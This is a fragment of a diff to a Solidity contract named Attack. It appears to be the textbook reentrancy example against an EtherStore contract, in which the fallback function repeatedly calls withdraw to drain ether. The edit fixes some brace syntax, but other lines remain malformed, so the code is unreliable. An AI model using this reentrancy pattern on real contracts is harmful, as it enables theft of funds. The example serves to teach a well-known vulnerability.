@@ -39,9 +39,10 @@ contract Attack {
     constructor (address _etherStoreAddress) public (
         etherStore = EtherStore(_etherStoreAddress) ;
    }
-    fallback() external payable (
+    fallback() external payable {
         if (address(etherStore).balance >= 1 ether ) {
-            etherStore.withdraw ( 1 ether ) ; // This is where the attacker exploits the withdraw function
+            etherStore.withdraw ( 1 ether ) ;// This is where the attacker exploits the withdraw function
+            }
    }
     function attack() external payable {
         require ( msg.value > = 1 ether ) ;
